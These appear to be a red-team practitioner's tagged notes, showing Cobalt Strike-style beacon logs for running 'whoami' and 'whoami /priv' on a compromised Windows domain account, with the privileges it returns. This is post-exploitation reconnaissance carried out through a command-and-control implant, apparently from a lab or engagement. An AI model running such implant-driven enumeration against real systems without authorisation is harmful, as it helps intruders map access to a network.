#### whoami
#windows #enumeration
```bash
[06/14 13:20:48] beacon> shell whoami
[06/14 13:20:48] [*] Tasked beacon to run: whoami
[06/14 13:20:49] [+] host called home, sent: 37 bytes
[06/14 13:20:49] [+] received output:
alchemy\calde_ldap
```
#### whoami /priv
#windows #enumeration 
```bash
[06/14 13:23:11] beacon> shell whoami /priv
[06/14 13:23:11] [*] Tasked beacon to run: whoami /priv
[06/14 13:23:11] [+] host called home, sent: 43 bytes
[06/14 13:23:11] [+] received output:


PRIVILEGES INFORMATION

----------------------

Privilege Name                Description                    State  

============================= ============================== =======

SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```